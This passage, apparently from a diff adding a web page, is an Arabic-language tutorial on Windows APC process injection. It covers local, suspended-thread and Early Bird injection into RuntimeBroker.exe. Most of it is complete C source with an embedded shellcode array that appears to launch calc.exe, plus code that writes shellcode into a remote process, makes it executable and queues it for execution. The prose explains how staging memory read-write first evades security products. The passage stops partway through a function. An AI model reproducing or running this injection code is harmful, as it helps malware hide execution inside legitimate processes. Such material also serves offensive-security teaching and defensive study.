+                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};<br><br>
+                        
+                        BOOL ApcInjectionFunc(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {<br><br>
+                        
+                            &nbsp;&nbsp;PVOID pAddress = NULL;<br>
+                            &nbsp;&nbsp;DWORD dwOldProtection = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
+                            &nbsp;&nbsp;if (pAddress == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;memcpy(pAddress, pPayload, sPayloadSize);<br><br>
+                        
+                                &nbsp;&nbsp;if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] QueueUserAPC Failed with Error : %d \n", GetLastError());<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                        &nbsp;&nbsp;}<br><br>
+                        
+                        }<br><br>
+                        
+                        VOID AlertableFunction() {<br><br>
+	
+                            &nbsp;&nbsp;HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);<br>
+                            &nbsp;&nbsp;if (hEvent) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;WaitForSingleObjectEx(hEvent, INFINITE, TRUE);<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;CloseHandle(hEvent);<br>
+                                &nbsp;&nbsp;}<br>
+                        }<br><br>
+                        
+                        int main() {<br><br>
+                        
+                            &nbsp;&nbsp;HANDLE hThread = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;hThread = CreateThread(NULL, NULL, &AlertableFunction, NULL, NULL, NULL);<br>
+                            &nbsp;&nbsp;if (hThread == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateThread Failed with Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;if (!ApcInjectionFunc(hThread, Payload, sizeof(Payload))) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...");<br>
+                                    &nbsp;&nbsp;getchar();<br><br>
+                        
+                                    &nbsp;&nbsp;return 0;<br>
+                        }<br>
+                </code></div><br>
+                <h2 style="direction: ltr;">3. Suspended Thread :</h2>
+                <p>[+] دلوقتي هنتكلم عن الـ <code style="background: gold; font-size: 14px;">Suspended Threads</code> ،
+                    ودي ببساطة ثريدات بننشئها بس بدل مـ تشتغل ع طول ، بتبدأ
+                    وهي
+                    متوقفة (Suspended) ، يعني موجودة فـ الميموري بس مش شغالة لسه .. الميزة فـ الطريقة دي إنك بتاخد وقتك
+                    تعدل عليها أو تحقن فيها كود معين قبل مـ تشغلها يدويا.</p>
+                <p style="font-weight: bold;">[+] يلا نشوف الكود :</p>
+                <ol>
+                    <li style="font-weight: bold;"> الـ DummyFunction :</li>
+                    دي مجرد فانكشن تجريبية مش بتعمل حاجة مفيدة ، هي بس بتستخدم عشان ننشئ ثريد يكون فـ الـ
+                    <code style="background: gold; font-size: 14px;">Suspended Mode</code> .. الكود اللـ جواها عبارة عن
+                    عمليات حسابية عشوائية باستخدام <code style="background: gold; font-size: 14px;">()rand</code> ،
+                    وهدفه الأساسي
+                    إنه يكون مجرد جسم للثريد بدون أي تأثير حقيقي.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Suspended-1.png" alt="APC-Injection-9" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">الـ Suspended Thread :</li>
+                    استخدمنا <code style="background: gold; font-size: 14px;">CREATE_SUSPENDED</code> عشان الثريد يبدأ
+                    متوقف (Suspended) بدل مـ يكون شغال من البداية ، وده
+                    بيدينا تحكم كامل قبل تشغيله.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Suspended-2.png" alt="APC-Injection-10" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">استئناف تشغيل الثريد.</li>
+                    <li style="font-weight: bold;">انتظار انتهاء الثريد :</li>
+                    السطر ده بيخلي البرنامج يستنى لحد مـ الثريد يخلص شغله قبل مـ يكمل تنفيذ باقي الكود .. هنا بنستخدم
+                    <code style="background: gold; font-size: 14px;">INFINITE</code> عشان نفضل منتظرين بدون حد زمني معين
+                    ، وده بيضمن إن الـ APC اللـ تم حقنها جوه الثريد تاخد
+                    فرصتها فـ التنفيذ قبل مـ البرنامج يكمل.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Suspended-3.png" alt="APC-Injection-11" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid gold;"></p>
+                <p style="font-weight: bold;">[+] يلا نـ رن :</p>
+                <ul>
+                    <li>تمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Suspended-4.png" alt="APC-Injection-11" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p>[+] الكود النهائي :</p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h><br>
+                        #include &lt;stdio.h><br><br>
+                        
+                        unsigned char Payload[] = {<br>
+                        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};<br><br>
+                        
+                        BOOL ApcInjectionFunc(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {<br><br>
+                        
+                            &nbsp;&nbsp;PVOID pAddress = NULL;<br>
+                            &nbsp;&nbsp;DWORD dwOldProtection = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
+                            &nbsp;&nbsp;if (pAddress == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualAlloc Failed with Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;memcpy(pAddress, pPayload, sPayloadSize);<br><br>
+                        
+                                &nbsp;&nbsp;if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] VirtualProtect Failed with Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                        
+                                    &nbsp;&nbsp;if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] QueueUserAPC Failed with Error : %d \n", GetLastError());<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                        &nbsp;&nbsp;}<br><br>
+                        
+                        }<br><br>
+                        
+                        VOID DummyFunction() {<br><br>
+
+                            int i = read();<br>
+                            int j = i + read();<br>
+                        }<br><br>
+                        
+                        int main() {<br><br>
+                        
+                            &nbsp;&nbsp;HANDLE hThread = NULL;<br><br>
+                        
+                            &nbsp;&nbsp;hThread = CreateThread(NULL, NULL, &AlertableFunction, NULL, CREATE_SUSPENDED, NULL);<br>
+                            &nbsp;&nbsp;if (hThread == NULL) {<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] CreateThread Failed with Error : %d \n", GetLastError());<br>
+                                &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                &nbsp;&nbsp;}<br><br>
+                        
+                                &nbsp;&nbsp;if (!ApcInjectionFunc(hThread, Payload, sizeof(Payload))) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br>
+                                    &nbsp;&nbsp;}<br><br>
+                                    &nbsp;&nbsp;ResumeThread(hThread);<br>
+                                    &nbsp;&nbsp;WaitForSingleObject(hThread, INFINITE);<br><br>
+                                    &nbsp;&nbsp;printf("[i] Press &lt;Enter> to Quit ...");<br>
+                                    &nbsp;&nbsp;getchar();<br><br>
+                        
+                                    &nbsp;&nbsp;return 0;<br>
+                        }<br>
+                </code></div><br>
+                <h2 style="direction: ltr;">4. Remote APC Injection (EarlyBird) :</h2>
+                <p>[+] هنتكلم دلوقتي ع طريقة تانية واللـ بتُستخدم كتير للـ APC Injection وهي الـ <code
+                        style="background: gold; font-size: 14px;">Early Bird APC
+                    Injection</code> :</p>
+                <ul>
+                    <li>التكنيك ده ببساطة عبارة عن إننا <code
+                            style="background: gold; font-size: 14px;">بنـ inject الشيل كود جوا بروسيس جديدة</code> قبل
+                        حتى مـ تبدأ تشتغل
+                        بشكل طبيعي.</li>
+                    <li>الفرق بينه وبين الطرق اللـ شرحناهم قبل كده هو إننا مش بنحقن كود جوه عملية شغالة ، إحنا اللـ
+                        بننشئ العملية من الأول ، ونوقفها نخليها ع حالة الـ Suspend ، ونحقن الكود بتاعنا ، بعدين نشغلها
+                        تاني عشان الشيل كود بتاعنا يشتغل قبل أي حاجة تانية.</li>
+                </ul>
+                <p style="font-weight: bold;">[+] تعالي أقولك الفكرة والخطوات :</p>
+                <ol>
+                    <li style="font-weight: bold;">تشغيل عملية جديدة متعلقة (CreateProcessA - Debug Mode) :</li>
+                    فـ الأول بنشغل عملية جديدة وهي <code
+                        style="background: gold; font-size: 14px;">RuntimeBroker.exe</code> بس مش بنشغلها ع طول .. لا ..
+                    بنشغلها فـ وضع التعليق
+                    (<code style="background: gold; font-size: 14px;">Suspended State</code>) باستخدام <code
+                        style="background: gold; font-size: 14px;">CreateProcessA</code> مع
+                    <code style="background: gold; font-size: 14px;">DEBUG_PROCESS</code>.<br>
+                    الفكرة هنا إننا نمنعها تشتغل طبيعي ، وندي نفسنا فرصة نضيف الشيل كود فيها الأول.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-1.png" alt="APC-Injection-12" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">حجز مكان فـ ذاكرة RuntimeBroker.exe :</li>
+                    بعد مـ العملية اشتغلت بس لسه متعلقة ، بنستخدم <code
+                        style="background: gold; font-size: 14px;">VirtualAllocEx</code> عشان نحجز مساحة فـ ذاكرتها عشان
+                    نضيف
+                    فيها الشيل كود.<br>
+                    المكان ده بيكون بصلاحيات قراءة وكتابة (RW) الأول ، لإنه لو كان تنفيذ مباشر ، برامج الحماية
+                    هتكتشفه.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-2.png" alt="APC-Injection-13" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">كتابة الـ Shellcode فـ ذاكرة RuntimeBroker.exe :
+                    </li>
+                    هنا بنستخدم <code style="background: gold; font-size: 14px;">WriteProcessMemory</code> عشان نكتب
+                    الشيل كود جوه المساحة اللـ حجزناها فـ ذاكرة العملية.<br>
+                    يعني دلوقتي الكود بتاعنا بقى متخزن جوه RuntimeBroker.exe ، بس لسه مش شغال.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-3.png" alt="APC-Injection-14" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">تغيير صلاحيات الذاكرة عشان نخلي الكود ينفذ :</li>
+                    بعد مـ كتبنا الكود ، بنحتاج نخليه قابل للتنفيذ ، فـ بنستخدم <code
+                        style="background: gold; font-size: 14px;">VirtualProtectEx</code> عشان نغير صلاحيات
+                    المساحة من RW (قراءة وكتابة) إلى RWX (قراءة وكتابة وتنفيذ).
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-4.png" alt="APC-Injection-15" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">تجهيز تشغيل الشيل كود :</li>
+                    دلوقتي الشيل كود بقى جاهز جوه العملية ، بس إزاي نخليه يشتغل؟<br>
+                    بنستخدم <code style="background: gold; font-size: 14px;">QueueUserAPC</code> عشان نضيف الشيل كود فـ
+                    قائمة انتظار الـ APC الخاصة بالـ Thread الرئيسي
+                    للعملية.<br>
+                    يعني أول ما العملية تشتغل ، بدل مـ تكمل عادي ، أول حاجة بتنفذها هي الكود بتاعنا.
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-5.png" alt="APC-Injection-16" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li style="font-weight: bold;">استئناف تشغيل RuntimeBroker.exe عشان ينفذ الشيل كود :</li>
+                    آخر خطوة بنفصل عملية التصحيح باستخدام <code
+                        style="background: gold; font-size: 14px;">DebugActiveProcessStop</code> ، وده بيخلي
+                    RuntimeBroker.exe يكمل
+                    تشغيله.<br>
+                    بس بدل مـ يبدأ عادي ، بيشوف أول حاجة فـ الـ APC Queue ، وإحنا ضايفين الشيل كود هناك ، فـ هيشغلة قبل
+                    أي حاجة تانية.
+
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-6.png" alt="APC-Injection-17" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid gold;"></p>
+                <p style="font-weight: bold;">[+] تعالي ندخل ع الكود :</p>
+                <ol>
+                    <li>دا عشان نتغاضي عن الإيرور بتاع الـ <code
+                            style="background: gold; font-size: 14px;">sprintf</code> .. واتكلمنا عنها فـ المقالات اللـ
+                        فاتت لو فاكر.</li>
+                    <li>دا تعريف للـ بروسيس اللـ هنشتغل عليها ومستهدفينها.</li>
+                    <li>نفس الشيل كود بتاع كل مرة.</li>
+                    <li>دي الفانكشن من المقالة اللـ فاتت بتاعة الـ <code
+                            style="background: gold; font-size: 14px;">Shellcode Injection</code>.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-7.png" alt="APC-Injection-18" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>فـ الخطوة الأولى بنحتاج نشغل بروسيس مستهدفة ، واللـ هي فـ المثال بتاعنا ده (RuntimeBroker.exe) ،
+                        بس بطريقة تخلينا نتحكم فيها قبل مـ تشتغل بالكامل .. وده بالضبط اللـ بتعمله الفانكشن
+                        <code style="background: gold; font-size: 14px;">CreateDebuggedProcess</code> ، زي مـ كان فـ
+                        الصورة اللـ فيها الخطوات ، أول خطوة كانت <code style="background: gold; font-size: 14px;">CreateProcessA -
+                            Debug</code> ، وهنا الكود بيستخدم <code
+                            style="background: gold; font-size: 14px;">CreateProcessA</code> مع <code
+                            style="background: gold; font-size: 14px;">DEBUG_PROCESS</code> عشان يشغل
+                        RuntimeBroker.exe فـ وضع
+                        التصحيح ، وده بيخليها متوقفة مؤقتا بدل مـ تشتغل ع طول.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-8.png" alt="APC-Injection-19" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>آخر جزء ودا الـ <code style="background: gold; font-size: 14px;">main func</code> .. وفـ الأول
+                        بيشغل الـ <code style="background: gold; font-size: 14px;">CreateDebuggedProcess</code> عشان
+                        تكون
+                        RuntimeBroker.exe
+                        فـ وضع الـ Debugging ، بعد كده بيتم حقن الشيل كود فـ البروسيس من خلال
+                        <code style="background: gold; font-size: 14px;">InjectShellcodeToRemoteProcess</code> ، بعدين
+                        بنستخدم <code style="background: gold; font-size: 14px;">QueueUserAPC</code> عشان ينضاف الشيل
+                        كود لقائمة الـ APC Queue ، بحيث يتنفذ ع طول ..
+                        بعد كده بيحصل استئناف للبروسيس باستخدام <code
+                            style="background: gold; font-size: 14px;">DebugActiveProcessStop</code> ، اللـ بيعمل
+                        Detach للـ Debugger من العملية ويخليها تستمر فـ التنفيذ بشكل طبيعي من غير أي شكوك ، واخر خطوة
+                        بنقفل الهاندل وانت كدا كدا عارف ليه من المقالات اللـ فاتت.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-9.png" alt="APC-Injection-20" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ol>
+                <p style="border-top: 2px solid gold;"></p>
+                <p>[+] يلا نـ رن :</p>
+                <ul>
+                    <li>هنلاقي إنه اشتغل وتمام ✅</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-10.png" alt="APC-Injection-21" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p>[+] بس تعالي نشوف تفاصيل أكتر .. هنشغل البرنامج تاني ونفتح الـ <a
+                        href="https://sourceforge.net/projects/processhacker/" target="_blank"
+                        class="download-link">Process Hacker</a></p>
+                <ul>
+                    <li>لو بحثت بـ اسم البروسيس هتلاقي إن اللـ عملناها لونها مختلف </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-11.png" alt="APC-Injection-22" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>ولو روحت ع <code style="background: gold; font-size: 14px;">Options > Highlighting</code> هتتأكد
+                        إن اللون ده يعني إنها فـ الـ <code
+                            style="background: gold; font-size: 14px;">Debugged Process</code>.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-12.png" alt="APC-Injection-23" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>وهنا هتلاقي تفاصيل زي مين الـ <code style="background: gold; font-size: 14px;">Parent</code>
+                        اللـ شغل البروسيس دي ، <code style="background: gold; font-size: 14px;">والكوماند</code> اللـ
+                        اتكتب عشان تشتغل.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-13.png" alt="APC-Injection-24" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>لو روحت ع الـ <code style="background: gold; font-size: 14px;">Address</code> ، هتلاقي إن الشيل
+                        كود موجود بس بصلاحيات <code style="background: gold; font-size: 14px;">Read & Write</code> بس.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-14.png" alt="APC-Injection-25" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>لما هتضغط Enter .. هتلاقي إن <code
+                            style="background: gold; font-size: 14px;">الصلاحيات إتغيرت</code> والشيل كود نقدر نشغله.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-15.png" alt="APC-Injection-26" class="article-image"
+                            loading="lazy">
+                    </div>
+                    <li>آخر خطوة هتضغط Enter تاني عشان تشغل الشيل كود .. وهيشتغل والدنيا تمام.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/EarlyBird-APC-16.png" alt="APC-Injection-27" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="border-top: 2px solid gold;"></p>
+                <p>[+] الكود النهائي :</p>
+                <div class="code-block">
+                    <code>
+                        #include &lt;Windows.h><br>
+                            #include &lt;stdio.h><br><br>
+                            
+                            #pragma warning (disable:4996)<br><br>
+                            
+                            #define TARGET_PROCESS	"Runtimebroker.exe"<br><br>
+                            
+                            unsigned char Payload[] = {<br>
+                            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"<br>
+                            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"<br>
+                            "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"<br>
+                            "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"<br>
+                            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"<br>
+                            "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"<br>
+                            "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"<br>
+                            "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"<br>
+                            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"<br>
+                            "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"<br>
+                            "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"<br>
+                            "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"<br>
+                            "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"<br>
+                            "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"<br>
+                            "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"<br>
+                            "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"<br>
+                            "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"<br>
+                            "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"<br>
+                            "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"<br>
+                            "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"<br>
+                            };<br><br>
+                            
+                            BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, PVOID* ppAddress) {<br><br>
+                            
+                                &nbsp;&nbsp;SIZE_T sNumberOfBytesWritten = NULL;<br>
+                                &nbsp;&nbsp;DWORD dwOldProtection = NULL;<br><br>
+                            
+                                &nbsp;&nbsp;*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>
+                                &nbsp;&nbsp;if (*ppAddress == NULL) {<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());<br>
+                                    &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                    &nbsp;&nbsp;}<br>
+                                    &nbsp;&nbsp;printf("\n[i] Allocated Memory At : 0x%p \n", *ppAddress);<br><br>
+                            
+                                    &nbsp;&nbsp;if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;printf("\n[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());<br>
+                                        &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                        &nbsp;&nbsp;}<br>
+                                        &nbsp;&nbsp;printf("[i] Press &lt;Enter> to write the Shellcode ... \n");<br>
+                                        &nbsp;&nbsp;getchar();<br>
+                                        &nbsp;&nbsp;printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);<br><br>
+                            
+                                        &nbsp;&nbsp;if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());<br>
+                                            &nbsp;&nbsp;&nbsp;&nbsp;return FALSE;<br>
+                                            &nbsp;&nbsp;}<br><br>
+                            
+                                            &nbsp;&nbsp;return TRUE;<br>
+                            }<br><br>
+                            
+                            BOOL CreateDebuggedProcess(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hProcess, HANDLE* hThread) {<br><br>
+                            
+                                &nbsp;&nbsp;CHAR lpPath	[MAX_PATH * 2];<br>
+                                &nbsp;&nbsp;CHAR WnDr [MAX_PATH];<br><br>
+                            
